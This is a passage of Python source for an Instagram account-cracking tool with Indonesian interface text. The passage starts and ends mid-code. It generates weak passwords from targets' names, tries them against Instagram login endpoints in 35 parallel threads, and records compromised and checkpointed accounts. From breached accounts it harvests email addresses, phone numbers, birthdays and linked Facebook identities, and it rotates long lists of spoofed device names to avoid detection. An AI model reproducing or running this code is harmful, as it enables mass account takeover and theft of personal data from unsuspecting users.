                   self.x.append(self.z+'1234')
                   self.x.append(self.z+'12345')
                   self.x.append(self.z+'123456')
                   self.x.append(self.z)
               else:
                   self.x.append(self.z+'123')
                   self.x.append(self.z+'1234')
                   self.x.append(self.z+'12345')
                   self.x.append(self.z)

           if len(nama) <5:pass
           else:
               self.x.append(nama.replace(' ','').lower())
               self.x.append(nama.lower())
           if komb == '3' or komb == '03':
               self.l = full.replace('_',' ').replace('.',' ').replace('__',' ')
               if len(self.l) <3:continue
               else:
                   try:
                       self.b = self.l.split(' ')
                       for self.r in self.b:
                           if len(self.r) <3:continue
                           elif len(self.r) <5:
                               self.x.append(self.r.lower())
                               self.x.append(self.r.lower()+'123')
                               self.x.append(self.r.lower()+'1234')
                               self.x.append(self.r.lower()+'12345')
                               self.x.append(self.r.lower()+'123456')
                           else:
                               self.x.append(self.r.lower())
                               self.x.append(self.r.lower()+'123')
                               self.x.append(self.r.lower()+'1234')
                               self.x.append(self.r.lower()+'12345')
                               self.x.append(self.r.lower()+'123456')
                   except:pass
       for self.d in self.x:
           if self.d not in self.i:
              if len(self.d) <=5:pass
              else:self.i.append(self.d)
       return self.i

   def cek_key(self, OS=None):
       try:
           if os.path.isfile('data/.keys.txt') is True:
              self.key = open('data/.keys.txt','r').read()
              self.xyz = requests.get('https://paste.tc/raw/licensu-64').text
              self.pok = re.findall(self.key + '.*', self.xyz)[0]
           else:
              if not OS:exit()
              else:pass
       except IndexError:
           if OS == True:pass
           else:exit('\nLicensi not found!')

   #-> Password
   def Exekusy2(self):
       self.KeyCek = self.cek_key(True)
       self.MyRic('\
[white]01. Sandi Full Name 1-5  03. Sandi Full Name,Username 1-5\n\
02. Sandi Full Name 1-6  04. Sandi Full Name 1-5 + Manual',True)
       sandine = Console(style=temane[0]).input(f'   └──> ')
       if sandine not in ['1','01','2','02','3','03','4','04']:
          print(f'\n{P}[{K2}!{P}] {K2}Pilihan Tidak Tersedia')
          self.Exekusy2()

       elif sandine in ['4','04']:
          sandi_tambahan = []
          self.MyRic('[white]Gunakan Koma Untuk Pemisahan, Pastikan sandi harus 6/Lebih!',True)
          tambahan = Console(style=temane[0]).input(f'   └──> ').split(',')
          for self.tambah in tambahan:
              if len(self.tambah)<=5:pass
              else:sandi_tambahan.append(self.tambah)

       self.MyRic(f'\
[white]Akun OK Di Simpan Di Folder : data/OK-Instagram-{file_ok}\n\
Akun CP Di Simpan Di Folder : data/CP-Instagram-{file_ok}\n\
- Mainkan Mode Pesawat Jika Proses Cepat 400 ID Slow 200 -')

       self.mayb = self.OverPower()
       with ThreadPoolExecutor(max_workers=35) as exe:
          for data in self.id:
              try:
                  idf, nama = data.split('|')
                  pw = self.pwdc(nama, idf, sandine)
                  if sandine == '4' or sandine == '04':
                     pw = pw + sandi_tambahan
                  else:pw = pw
                  if '1' in self.MethodType:
                      exe.submit(self.ApiThreads, idf, pw)
                  elif '2' in self.MethodType:
                      exe.submit(self.Api, idf, pw)
                  elif '3' in self.MethodType:
                      exe.submit(self.ApiRecovery, idf, pw)
                  else:
                      exe.submit(self.SmartLockGoogle, idf, pw)
              except:pass

       if self.ResultSuccess !=0 or self.ResultChechpoint !=0:
          self.total = self.ResultSuccess + self.ResultChechpoint
          print(f'\n\n{P} Crack Selesai\n\n Anda Mendapatkan {self.total} akun\n Akun OK : {H}{self.ResultSuccess}{P}\n Akun CP : {K2}{self.ResultChechpoint}{P}\n\n Terima Kasih Telah Menggunakan Tools Ini\n \t- {H}Rikod ahli {P}-')
          exit(0)
       else:
          print(f'\n\n{P} Crack Selesai\n{K2} Ups Anda Tidak Mendapatkan Hasil Kali Ini\n{K2} Silahkan Ganti Target Dan Pastikan Tidak Menggunakan Wifi')
          exit(1)

   #-> Info Akun Terkait
   def Fafo(self, cokie):
       try:
           self.c = re.findall('csrftoken=(.*?);',str(cokie))
           self.x = {"Host": "www.instagram.com","content-length": "0","x-requested-with": "XMLHttpRequest","x-csrftoken": "tJdFh5wJTuFDQZvpadl2kTm0LGRSkH8w" if len(self.c) == 0 else self.c[0],"x-ig-app-id": "936619743392459","x-instagram-ajax": "1011212827","user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36","content-type": "application/x-www-form-urlencoded","accept": "*/*","x-asbd-id": "129477","cookie":cokie}
           self.r = requests.post('https://www.instagram.com/api/v1/web/fxcal/ig_sso_users/', headers = self.x).json()
           if 'fbAccount' in str(self.r):
              self.nama = self.r['fbAccount']['display_name']
              self.Reqz = requests.get('https://accountscenter.instagram.com/profiles/', cookies = {'cookie':cokie}).text
              self.User = re.search('{"__typename":"XFBFXFBAccountInfo","id":"(.*?)"}', str(self.Reqz)).group(1)
           else:
              self.nama = None
              self.User = None
       except:
           self.nama = 'Requests Error!'
           self.User = 'Requests Error!'
       self.aku = '%s%s|%s'%(H,self.User, self.nama)
       return(self.aku)

   #-> Custom Android ID
   def Android_ID(self, users, passwd):
       self.xyz = hashlib.md5()
       self.xyz.update(users.encode('utf-8') + passwd.encode('utf-8'))
       self.hex = self.xyz.hexdigest()
       self.xyz.update(self.hex.encode('utf-8') + '12345'.encode('utf-8'))
       return self.xyz

   #-> Info result OK
   def friends_user(self, cookies):
       try:
            InfoHeaders = {'x-ig-app-locale': 'in_ID','x-ig-device-locale': 'in_ID','x-ig-mapped-locale': 'id_ID','x-bloks-version-id': '8ca96ca267e30c02cf90888d91eeff09627f0e3fd2bd9df472278c9a6c022cbb','x-bloks-is-layout-rtl': 'false','x-ig-capabilities': '3brTv10=','x-ig-app-id': '567067343352427','priority': 'u=3','user-agent': 'Instagram 275.0.0.27.98 Android (25/7.1.2; 240dpi; 720x1280; Google/google; google Pixel 2; x86; android_x86; in_ID; 458229257)','accept-language': 'id-ID, en-US','x-fb-http-engine': 'Liger','x-fb-client-ip': 'True','x-fb-server-cluster': 'True'}
            edit = {'edit': 'true'}
            info = requests.get('https://i.instagram.com/api/v1/accounts/current_user/', params=edit, headers=InfoHeaders, cookies = {'cookie':cookies}).json()['user']
            info_email = info['email']
            info_full_nama = info['full_name']
            info_username = info['username']
            info_nomor_hp = info['phone_number']
            info_akun_id = info['pk_id']
            info_birthday = info['birthday']
            info_kedua = requests.get(f'https://i.instagram.com/api/v1/users/{info_akun_id}/info/', headers=InfoHeaders, cookies = {'cookie':cookies}).json()['user']
            info_followers = info_kedua['follower_count']
            info_following = info_kedua['following_count']
            return info_email,info_full_nama,info_username,info_nomor_hp,info_birthday,info_followers,info_following
       except:return None

   #-> Info No Login
   def friends_user_chek(self, username):
       try:
           self.head.update({'Host': 'www.instagram.com','cache-control': 'max-age=0','upgrade-insecure-requests': '1','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','sec-fetch-site': 'none'})
           req = requests.get(f'https://www.instagram.com/api/v1/users/web_profile_info/?username={username}', headers=self.head).json()['data']['user']
           ikut,mengikut,posting = req['edge_followed_by']['count'],req['edge_follow']['count'],req['edge_owner_to_timeline_media']['count']
           return(ikut,mengikut,posting)
       except:return(None,None,None)

   #-> Convert cokie dict {}
   def Convert(self, dict_c):
       cokz = ';'.join(['%s=%s'%(x,y) for x,y in dict_c.items()])
       return cokz

   def AppUac(self, GoblokLu=None):
        self.htc = ["HTC One M8", "HTC One M9", "HTC 10", "HTC U11", "HTC U12+", "HTC Desire 626", "HTC Sensation", "HTC EVO 4G", "HTC One X", "HTC Desire Eye", "HTC One A9", "HTC U Ultra", "HTC Butterfly", "HTC Desire 820", "HTC Wildfire", "HTC HD2", "HTC Evo Shift 4G", "HTC Desire 610", "HTC One Mini", "HTC ThunderBolt", "HTC Droid DNA", "HTC Desire 816", "HTC Legend", "HTC Sensation XL", "HTC Incredible S", "HTC One S", "HTC Rhyme", "HTC Desire HD", "HTC Evo 3D", "HTC Touch Pro 2"]
        self.nexus = ['Galaxy Nexus', 'Nexus 10', 'Nexus 2', 'Nexus 4', 'Nexus 4', 'Nexus 4', 'Nexus 4', 'Nexus 4', 'Nexus 4', 'Nexus 5', 'phone/Nexus 5', 'Nexus 5X', 'Nexus 6', 'Nexus 7', 'Nexus 9', 'Nexus One', 'Nexus One', 'Nexus One', 'Nexus One', 'Nexus One', 'Nexus One', 'Nexus Player', 'Nexus Player', 'Nexus S', 'Nexus S', 'Nexus S 4G', 'nexus S', 'Nexus S', 'Nexus s', 'Nexus S', 'Nexus S', 'Nexus S', 'Nexus S', 'Nexus S']
        self.pixel = ["Pixel 5a", "Pixel 4a 5G", "Pixel 2 XL", "Pixel 6 Pro", "Pixel 4 XL", "Pixel 5", "Pixel 3", "Pixel 3 XL", "Pixel 4a", "Pixel 4", "Pixel 3a","Pixel 5 XL","Pixel 7a","Pixel 6 XL","Pixel 4a","Pixel 6a","Pixel 3a","Pixel 7 XL"]
        self.micromax = ['Micromax 10', 'Micromax 1J', 'Micromax 86519', 'Micromax A064', 'Micromax_A064', 'Micromax A065', 'Micromax_A065', 'Micromax A066', 'Micromax_A066', 'Micromax A067', 'Micromax_A067', 'MICROMAX_A068', 'MICROMAX A068', 'Micromax A068', 'Micromax A069', 'Micromax_A069', 'Micromax A075', 'Micromax A082', 'Micromax_A082', 'Micromax A089', 'Micromax_A089', 'Micromax A091', 'Micromax A092', 'Micromax_A092', 'Micromax A093', 'Micromax_A093', 'Micromax A095', 'Micromax A096', 'Micromax_A101', 'Micromax A102', 'Micromax_A102', 'Micromax A104', 'Micromax a104', 'Micromax A105', 'Micromax_A105', 'Micromax A106', 'Micromax-A106', 'Micromax A108', 'Micromax_A109', 'Micromax A109', 'Micromax A110', 'Micromax_A110', 'Micromax A110Q', 'Micromax_A110Q', 'Micromax A111', 'Micromax A114', 'Micromax A114R', 'Micromax_A114R', 'Micromax A115', 'Micromax_A115', 'Micromax A116', 'Micromax_A116', 'Micromax A116i', 'Micromax_A116i', 'Micromax A117', 'Micromax_A117', 'Micromax A118R', 'Micromax A119', 'Micromax A120', 'Micromax A121', 'Micromax_A121', 'Micromax A15', 'Micromax A177', 'Micromax A190', 'Micromax_A190', 'Micromax A200', 'Micromax_A200', 'Micromax A21', 'Micromax A210', 'Micromax A24', 'Micromax_A24', 'Micromax A25 Smarty', 'Micromax A250', 'Micromax A255', 'Micromax_A255', 'Micromax A26', 'Micromax_A26', 'Micromax_A27', 'Micromax A27', 'Micromax_A28', 'Micromax A28/GRI40', 'Micromax A28', 'Micromax A290', 'Micromax A30', 'Micromax A300', 'Micromax A310', 'Micromax A311', 'Micromax A315', 'Micromax_A315', 'Micromax_A316', 'Micromax A316', 'Micromax_A34', 'Micromax A34', 'Micromax_A35', 'Micromax A35', 'Micromax A350', 'Micromax_A36', 'Micromax A36', 'Micromax_A37', 'Micromax A37', 'Micromax A37B', 'Micromax_A37B', 'Micromax A40', 'Micromax_A40', 'Micromax A46', 'Micromax_A46', 'Micromax A47', 'MicromaxA47', 'Micromax_A50', 'Micromax A50', 'Micromax A51', 'Micromax A52', 'Micromax A54', 'Micromax A56', 'Micromax_A57', 'Micromax A57', 'Micromax A58', 'Micromax_A58', 'Micromax A59', 'Micromax A60', 'Micromax A61', 'Micromax A62', 'Micromax_A62', 'Micromax A63', 'Micromax_A63', 'Micromax_A65', 'Micromax A65', 'Micromax_A66', 'Micromax A66', 'Micromax A67', 'Micromax A68', 'Micromax A69', 'Micromax_A69', 'Micromax_A70', 'Micromax A700', 'Micromax A71', 'Micromax_A71', 'Micromax A72', 'Micromax_A72', 'Micromax A73', 'Micromax_A74', 'Micromax A74', 'Micromax A75', 'Micromax_A76', 'Micromax A76', 'Micromax A77', 'Micromax A78', 'Micromax A79', 'en_us Micromax A80', 'Micromax A80', 'Micromax A82', 'Micromax_A82', 'Micromax A84', 'Micromax A85', 'Micromax A86', 'Micromax_A86', 'Micromax_A87', 'Micromax A87', 'Micromax A87 . Ninja 4.0', 'Micromax A88', 'Micromax_A88', 'Micromax A89', 'Micromax A90', 'Micromax A90s', 'MIcromax_A90s', 'Micromax A90S', 'Micromax A91', 'Micromax_A91', 'Micromax_A92', 'Micromax A92', 'MicromaxA93', 'Micromax A93', 'Micromax A94', 'Micromax_A94', 'Micromax A96', 'Micromax_A96', 'Micromax A97', 'Micromax_A99', 'Micromax A99', 'Micromax_AD3520', 'Micromax AD3520', 'Micromax AD3550', 'Micromax AD4500', 'Micromax_AD4500', 'Micromax AE90', 'Micromax AO5510', 'Micromax AQ5000', 'Micromax B4A', 'Micromax B5 Pro', 'B5Pro', 'Micromax_Bharat_5_Plus', 'Micromax Q402Plus', 'Micromax Q440', 'Micromax Bharat 5', 'Micromax Q4204', 'Micromax Bharat 5 Plus', 'Micromax Bharat 5 Pro', 'Micromax Bolt 3425', 'Micromax Bolt 2', 'Micromax Q402+', 'Micromax Q306', 'Micromax Q3001', 'Micromax Q301', 'Micromax Q303', 'Micromax Q324', 'Micromax Q326', 'Q327', 'Micromax Q327', 'Micromax Q3301', 'Micromax Q333', 'Micromax_Q333', 'Micromax Q338', 'Micromax Q346', 'Micromax Q354', 'Micromax Q357', 'Micromax Q383', 'Micromax_S302', 'Micromax S302', 'Micromax Q424', 'Micromax Q352', 'Micromax Q4101', 'Micromax C2A', 'Micromax C9', 'Micromax C1', 'Micromax C1A', 'Micromax C2APLS', 'Micromax Q4310', 'Micromax E4815', 'arm_64 Micromax E481', 'Micromax E481', 'Micromax E4816', 'Micromax Q462', 'Micromax Q463', 'Micromax E485', 'Micromax E484', 'Micromax AQ4501', 'Micromax AQ4502', 'A240', 'Micromax A240', 'Micromax Q391', 'Micromax E453', 'Micromax A107', 'Micromax HS2', 'Micromax HS1', 'Micromax_HS3', 'en Micromax_HS3', 'AQ5001', 'Micromax AQ5001', 'AQ5001 Canvas Power', 'Micromax Q392', 'Micromax Q465', 'Micromax Q461', 'Micromax Q350R', 'Micromax Q421', 'Micromax Q417', 'Micromax Q426', 'Micromax Q4260', 'Micromax E311', 'Micromax E352', 'Micromax E455', 'Micromax Q415', 'Micromax Q355', 'Micromax Q469', 'Micromax E451', 'Micromax E451', 'Micromax Q340', 'Micromax Q349', 'Micromax Q345', 'Micromax Q450', 'Micromax Q480', 'arm_64 Micromax Q480', 'Micromax Q380', 'Micromax Q3502', 'Micromax Q351', 'Micromax Q385', 'P70221', 'Micromax P681', 'MicromaxP802', 'Micromax Q427', 'Micromax_Q427', 'Micromax Q413', 'Micromax E313', 'Micromax D2', 'Micromax D200', 'Micromax_D200', 'Micromax D303', 'Micromax D304', 'Micromax_D304', 'Micromax D305', 'Micromax D306', 'Micromax D320', 'Micromax D321', 'Micromax D333', 'Micromax D340', 'Micromax D7517', 'Micromax DM5003', 'Micromax E353', 'Micromax E457', 'Micromax E458', 'Micromax E460', 'Micromax E471', 'Micromax E4817', 'Micromax E482', 'Micromax E483', 'Micromax E5018M', 'Micromax EG111', 'Micromax EG116', 'micromax F', 'micromax F189', 'Micromax F601', 'MicromaxF666', 'Micromax IN', 'Micromax E7533', 'Micromax E6523', 'IN_2b', 'IN_Note1', 'MICROMAX IN1', 'N8216', 'N8301', 'ione note', 'MICROMAX ione note', 'Micromax N4120', 'Micromax N8202', 'Micromax Ninja', 'Micromax Nitro', 'Micromax Note 1+', 'Micromax Note 5', 'Micromax Note3', 'Micromax NX', 'Micromax P001', 'Micromax P250(Funbook)', 'Micromax P255', 'Micromax P256', 'xx Micromax P275', 'Micromax_P275', 'Micromax P275', 'Micromax P280', 'Micromax P290', 'Micromax P310', 'Micromax P350', 'xx Micromax P350', 'Micromax P360', 'Micromax P362', 'Micromax P365', 'Micromax P410', 'Micromax P410i', 'Micromax_P410i', 'Micromax P420', 'Micromax P469', 'Micromax P470', 'MicromaxP480', 'Micromax P500(Funbook)', 'Micromax P560', 'Micromax P580', 'Micromax P580i', 'Micromax P600', 'Micromax P650', 'Micromax P650E', 'Micromax P660', 'Micromax P660', 'Micromax_P666', 'Micromax P666', 'MicromaxP680', 'Micromax P690', 'Micromax P701', 'MicromaxP702', 'Micromax P810', 'en Micromax Q300', 'Micromax_Q300', 'Micromax Q323', 'Micromax_Q323', 'Micromax Q325', 'Micromax_Q325', 'Micromax Q331', 'Micromax_Q331', 'Micromax Q332', 'Micromax_Q332', 'Micromax Q334', 'Micromax Q335', 'Micromax_Q335', 'Micromax Q336', 'Micromax_Q336', 'Micromax Q341', 'Micromax Q343', 'Micromax Q348', 'Micromax_Q353', 'en Micromax_Q353', 'Micromax_Q353P', 'Micromax Q3551', 'Micromax Q3555', 'Micromax Q361', 'Micromax Q370', 'Micromax_Q370', 'Micromax Q371', 'Micromax_Q371', 'Micromax Q375', 'Micromax_Q375', 'Micromax Q379', 'Micromax Q381', 'Micromax Q382', 'Micromax Q386', 'Micromax Q394', 'Micromax_Q394', 'Micromax Q395', 'Micromax Q397', 'Micromax Q398', 'arm Micromax Q398', 'Micromax Q400', 'Micromax_Q400', 'Micromax Q4002', 'en Micromax Q4002', 'Micromax Q401', 'Micromax Q402', 'Micromax Q402 Ultra', 'Micromax Q404', 'Micromax Q411', 'Micromax_Q411', 'Micromax Q412', 'Micromax Q414', 'Micromax Q416', 'Micromax Q419', 'Micromax Q4201', 'Micromax Q422', 'Micromax Q4220', 'Micromax Q423', 'Micromax Q428', 'Micromax_Q428', 'Micromax Q429', '720X1280 Micromax Q4309', 'Micromax Q4312', 'en_US Micromax Q437', 'Micromax Q440Plus', 'Micromax Q454', 'Micromax Q470', 'Micromax Q479', 'Micromax Q491', 'Micromax_Q491', 'Micromax Q502+', 'Micromax Q666', 'Micromax Q67', 'micromax Q68', 'micromax Q78', 'Micromax S300', 'Micromax_S300', 'Micromax S301', 'Micromax_S301', 'Micromax Q4311', 'Micromax Q4601', 'Micromax Q409A', 'Micromax Q409', 'Micromax Q452', 'Micromax Unite 3', 'Micromax Unite 2', 'Micromax Unite 2 A106', 'Micromax Q372', 'Micromax V89', 'Micromax Q4001', 'Micromax Q4202', 'Micromax Q4251', 'arm Micromax Q4251', 'Micromax W5509', 'Micromax X5098', 'Micromax-Xzoom A52', 'YU5530', 'YU5040', 'Micromax YU5900', 'YU5012', 'Micromax Z59']
        self.mz_plus = ['MZ-m1 note','MZ-m2 note','MZ-M3s','MZ-M3','MZ-M5s','MZ-M3 Max','MZ-m3 note','MZ-MX4','MZ-U20','MZ-MX4 Pro','MZ-PRO 5','MZ-U10','MZ-M5c','MZ-meizu M8 lite','MZ-mmm52','MZ-Meizu S6','MZ-M3 Max','MZ-M1 E','MZ-meizu note9','MZ-16 X','MZ-16th Plus','MZ-15 Plus','MZ-16T','MZ-M6','MZ-PRO 7 Plus','MZ-m1 metal','MZ-16s Pro','MZ-M5 Note','MZ-Meizu 6T','MZ-16 X','MZ-16th','MZ-MEIZU 18X','MZ-MEIZU 18s','MZ-M1822','MZ-meizu 17','MZ-meizu 17 Pro','MZ-MEIZU 18 Pro','MZ-TYH212U','MZ-MEIZU 20','MZ-MEIZU 20 Pro','Meizu C3','MZ-ZTE T660','ZTE BLADE 8']
        self.vivo = ['vivo 1002T', 'Vivo 1605', 'vivo 1730', 'vivo 1809', 'vivo_1820', 'vivo 1835', 'vivo 1914', 'vivo 2010', 'vivo 2019', 'vivo 2019', 'vivo 2019', 'vivo 2023', 'vivo 2027', 'vivo 3969', 'VIVO 5', 'Vivo 6', 'Vivo 7 Pro', 'Vivo 8', 'Vivo 93K Prime', 'vivo A5 ', 'vivo a54', 'Vivo A54', 'vivo a57', 'Vivo A87', 'VIVO A94', 'VIVO AIR', 'VIVO C8818', 'vivo E1', 'vivo E3', 'vivo E3', 'vivo E5', 'Vivo EGO', 'V1962BA', 'vivo h5', 'V1824A', 'V1824A', 'V1824BA', 'V2217A', 'V2217A', 'V2218A', 'V2218A', 'V2218A', 'V2243A', 'V1955A', 'I1927', 'I1928', 'V2024A', 'V2025A', 'V2025A', 'V2049A', 'V2049A', 'I2009', 'I2012', 'I2012', 'V2136A', 'V2136A', 'V2141A', 'V2171A', 'I2017', 'V2172A', 'V2172A', 'I2022', 'I2019', 'I2019', 'I2201', 'V1914A', 'V1914A', 'V1981A', 'V2055A', 'V2118A', 'V2157A', 'V2157A', 'V2154A', 'V2196A', 'V2196A', 'V2199A', 'V2231A', 'V2238A', 'V1936AL', 'V1936A', 'V1922A', 'V1922A', 'V1922A ', 'V1916A', 'V2023A', 'V2023A', 'VIVO V2023A', 'V2065A', 'V2061A', 'V2061A', 'V2143A', 'V2106A', 'V2165A', 'V2165A', 'V2180GA', 'V1986A', 'V2012A', 'V2012A', 'V2073A', 'V2073A', 'I2011', 'V2148A', 'I2018', 'V1919A', 'V2131A', 'V2220A', 'I2202', 'I2206', 'I2203', 'I2202', 'I2127', 'I2202', 'I2208', 'I2208', 'I2126', 'I2126', 'I2126', 'V2164KA', 'V2164KA', 'VIVO IV', 'VIVO IV', 'VIVO IV', 'VIVO IV', 'Vivo J5', 'vivo 1805', 'vivo 1805', 'vivo NEX', 'V1923A', 'vivo 1912', 'V1923A', 'vivo 1912', 'vivo 1913', 'V1924A', 'V1924A', 'vivo 1913', 'V1950A', 'V1950A', 'vivo NEX A', 'vivo NEX A', 'vivo 1813', 'V1821A', 'V1821A', 'vivo NEX S', 'vivo NEX S', 'Vivo ONE', 'Vivo ONE', 'PA2170', 'vivo PD1628F_EX', 'vivo PD1709', 'vivo PD1709F_EX', 'vivo PD1709F_EX', 'vivo PD1728', 'vivo PD1728', 'vivo PD1832F_EX', 'vivo PD2046F_EX', 'vivo PD2050F_EX', 'vivo PD2055F_EX', 'vivo PD2059F_EX', 'Vivo S', 'V1831A', 'V1831A', 'VIVO S1', 'Vivo S1 Prime', 'V1832A', 'V1832T', 'V2121A', 'V2121A', 'V2130A', 'V2130A', 'Vivo S11', 'Vivo S11 ', 'vivo S11t', 'vivo S11t', 'vivo S11t', 'vivo S11t', 'vivo S12', 'V2162A', 'Vivo S13', 'V2203A', 'V2207A', 'V2190A', 'V2244A', 'vivo S1Pro', 'Vivo S20 ', 'Vivo S21 ', 'Vivo S31', 'Vivo S4', 'Vivo S40', 'Vivo S41 /MMB439M', 'V1932A', 'vivo S6', 'V1962A', 'vivo S6T', 'V2020CA', 'V2020A', 'Vivo S76', 'V2031EA', 'vivo S7i(t)', 'vivo S7i(t)', 'vivo S7i(t)', 'V2080A', 'vivo S7t', 'vivo_S7t', 'vivo S7t', 'S7t 5G', 'vivo S7w', 'vivo S8', 'vivo S9', 'vivo S9', 'vivo S9', 'V2072A', 'V2048A', 'vivo S9t', 'V2168', 'V2168', 'V2153', 'V2153', 'V2150', 'V2151', 'V2151', 'V2151', 'V2143', 'vivo TD1602_EX', 'vivo U1', 'vivo 1916', 'vivo 1916', 'vivo 1921', 'V1941A', 'V1941A', 'V1928A', 'vivo V1', 'vivo V1', 'vivo V10', 'Vivo V10', 'VIVO V11', 'Vivo V11', 'vivo 1804', 'vivo 1804', 'vivo 1806', 'vivo 1806', 'vivo v11pro', 'vivo 1819', 'vivo 1818', 'vivo 1818', 'vivo 1920', 'vivo 1919', 'vivo 1907', 'vivo 1907', 'vivo 1907_19', 'vivo 1910', 'vivo 1909', 'vivo 1910', 'vivo 1933', 'vivo 1933', 'vivo V1907', 'vivo v19neo', 'vivo V1Max', 'vivo V1Max', 'vivo V2', 'V2040', 'vivo 2018', 'vivo 2018', 'V2022', 'Vivo V20A', 'Vivo V20G', 'V2066', 'V2108', 'V2050', 'V2050', 'V2050', 'V2061', 'V2055', 'Vivo V21S', 'V2130', 'V2132A', 'V2116', 'V2115', 'V2116', 'V2116', 'V2126', 'V2126', 'V2228', 'V2228', 'V2158', 'V2158', 'V2202', 'V2202', 'V2201', 'V2246', 'V2230', 'V2230', 'V2237', 'vivo V3', 'vivo V3', 'vivo V3Max A', 'vivo V3Max L', 'vivo v30', 'vivo v31', 'vivo V3L', 'vivo V3L', 'vivo V3L', 'vivo V3L', 'vivo V3M A', 'vivo V3M A', 'vivo V3MA', 'vivo_V3Max', 'vivo v45', 'vivo 1601', 'vivo V5', 'vivo 1609', 'vivo 1611', 'Vivo V51', 'Vivo V54', 'vivo 1612', 'vivo 1713', 'vivo V5S A', 'vivo 1718', 'vivo 1716', 'vivo Y79A', 'vivo Y79A', 'V2166BA', 'Vivo V8', 'vivo 1723', 'vivo V9 mini', 'vivo 1851', 'VIVO V9Pro', 'vivo 1851', 'vivo 1727', 'Vivo X', 'V2178A', 'V2229A', 'V2170A', 'V2170A', 'vivo Xplay3S', 'vivo Xplay3S', 'vivo Xplay3S', 'vivo Xplay5A', 'vivo Xplay5A', 'vivo Xplay5A', 'vivo Xplay5S', 'vivo Xplay5S', 'vivo Xplay6', 'vivo Xplay6L', 'vivo Xplay6', 'vivo Xplay6', 'vivo X710L', 'vivo X710L', 'vivo X710L', 'vivo X710L', 'vivo X1', 'vivo X1', 'vivo X1', 'vivo X1', 'Vivo X11', 'vivo X1S', 'vivo X1S', 'vivo X1S', 'vivo X1St', 'vivo X1St', 'vivo X1St', 'vivo X1St', 'vivo X1St', 'vivo X1W', 'vivo X1w', 'VIVO X2', 'VIVO X2', 'VIVO_X2', 'vivo X20', 'vivo X20A', 'vivo X20Plus A', 'vivo 1720', 'vivo X20Plus UD', 'vivo X20Plus UD', 'vivo X21', 'vivo X21A', 'vivo X21UD A', 'vivo X21i', 'vivo X21i A', 'vivo X21i', 'vivo X21i A ', 'V1814A', 'V1814T', 'V1814T', 'V1814A', 'V1809A', 'V1809A', 'V1816A', 'V1809T', 'V1816T', 'V1829A', 'V1838A', 'V1838T', 'V1829T', 'V1836A', 'V1836A', 'V1836T', 'vivo X27Pro', 'V1938CT', 'V1938T', 'V1938T', 'vivo X3F', 'vivo X3F', 'vivo X3F', 'vivo X3L', 'vivo X3L', 'vivo X3S', 'vivo X3S', 'vivo X3S', 'vivo X3S', 'vivo X3S', 'vivo X3S', 'vivo X3S W', 'vivo X3S W', 'vivo X3S W', 'vivo X3S W', 'vivo X3t', 'vivo X3t', 'vivo X3t', 'vivo X3t', 'vivo X3V', 'vivo X3V', 'vivo X3V', 'vivo X3V', 'Vivo X40', 'vivo X5L', 'vivo X5', 'vivo X5L', 'vivo X5Pro D', 'vivo X5Pro L', 'vivo X5Pro V', 'vivo X5Pro D', 'vivo X5Pro D', 'V2001A', 'V2001A', 'vivo 2004', 'vivo 2005', 'vivo 2005', 'V1937', 'vivo 1937', 'V1937', 'V1937', 'vivo 2006', 'vivo 2006', 'V2005A', 'V2011A', 'X50 Pro+', 'V1930', 'V1930', 'vivo X510t', 'vivo X510t', 'vivo X510t', 'vivo X510t', 'vivo X510t', 'vivo X520L', 'vivo X5F', 'vivo X5M', 'vivo X5M', 'vivo X5M', 'vivo X5Max ', 'vivo X5Max L', 'vivo X5Max L', 'vivo X5Max S', 'vivo X5Max V', 'vivo X5S L', 'vivo X5S L', 'vivo X5V', 'vivo X5V', 'vivo X5V', 'vivo X6D', 'vivo X6A', 'vivo X6Plus D', 'vivo X6Plus A', 'vivo X6Plus L', 'vivo X6Plus D', 'vivo X6Plus A', 'vivo X6Plus D', 'vivo X6Plus L', 'V2046A', 'V2059A', 'V2046A', 'V2045', 'V2046', 'V2047A', 'V2056A', 'V2085A', 'vivo X6S A', 'vivo X6S A', 'vivo X6S A', 'vivo X6S A', 'vivo X6SPlus D', 'vivo X6SPlus D', 'vivo X6SPlus D', 'vivo X6SPlus D', 'vivo X6SPlus A', 'vivo X7L', 'vivo X7Plus', 'vivo X7Plus', 'V2133A', 'V2104', 'V2104', 'V2105', 'V2134A', 'V2105', 'V2145A', 'V2114', 'V2145A', 'vivo X710F', 'vivo X710F', 'vivo X710F', 'vivo X710F', 'V2144', 'V2183A', 'V2144', 'V2208', 'V2185A', 'V2145', 'V2185A', 'Vivo X83', 'vivo X9', 'vivo X9L', 'vivo X9', 'vivo X9', 'vivo X9Plus', 'vivo X9Plus L', 'V2241A', 'V2242A', 'V2242A', 'V2227A', 'vivo X9i', 'vivo X9i', 'vivo X9i', 'vivo X9s', 'vivo X9s L', 'vivo X9s Plus', 'vivo X9s Plus', 'vivo X9s Plus L', 'vivo X9s Plus', 'VIVO XL', 'vivo Xplay', 'vivo Xshot', 'vivo Xshot', 'vivo Xshot', 'vivo Xshot', 'V2203', 'V2221', 'Vivo y1', 'Vivo Y1', 'V2168A', 'V2168A', 'vivo 1906', 'V2028', 'vivo Y11t', 'vivo Y11t', 'vivo Y11t', 'vivo 1904', 'V2163A', 'V2102', 'V2102', 'vivo 2007', 'vivo 2007', 'Vivo Y12I Pro', 'V2026', 'V2042', 'V2033', 'V2039', 'V2069', 'V2026_21', 'vivo Y13L', 'vivo Y13', 'vivo Y13L', 'vivo Y13L', 'vivo Y13i', 'vivo_Y13i', 'vivo Y13iL', 'vivo Y13iL', 'vivo Y13T', 'vivo Y13T', 'vivo 1901', 'vivo Y15T', 'vivo Y15T', 'V2134', 'V2147', 'V2147', 'V2212', 'V2120', 'V2204', 'V2214', 'V2204', 'vivo 1902', 'vivo 1902_19', 'VIVO 1902', 'vivo Y17T', 'vivo Y17T', 'vivo_Y17T', 'vivo Y17T', 'vivo Y17W', 'vivo Y17W', 'vivo Y17W', 'vivo Y18L', 'vivo Y18L', 'vivo Y18L', 'vivo 1915', 'vivo Y19t', 'vivo Y19t', 'vivo Y19t', 'vivo Y19t', 'Vivo Y1i', 'vivo 2015', 'vivo 2015', 'V2029', 'V2027', 'V2043_21', 'V2101', 'V2070', 'V2054', 'V2052', 'V2037', 'V2032', 'V2038', 'V2038', 'V2129', 'V2129', 'V2111', 'V2149', 'V2140', 'V2140', 'V2152', 'V2152', 'V2110', 'V2110', 'V2131', 'V2135', 'V2207', 'vivo Y22iL', 'vivo Y22iL', 